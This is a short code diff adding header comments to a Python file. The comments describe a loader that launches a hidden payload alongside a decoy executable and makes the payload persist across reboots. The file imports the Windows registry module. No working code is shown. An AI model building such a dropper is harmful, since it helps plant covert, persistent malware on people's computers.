@@ -1,3 +1,7 @@
+# loader spawns off two processes, the payload.py, and your decoy.exe you load it with.
+# attempts to install payload so respawns on reboot.
+# author: oxagast
+
 import os
 import time
 import winreg
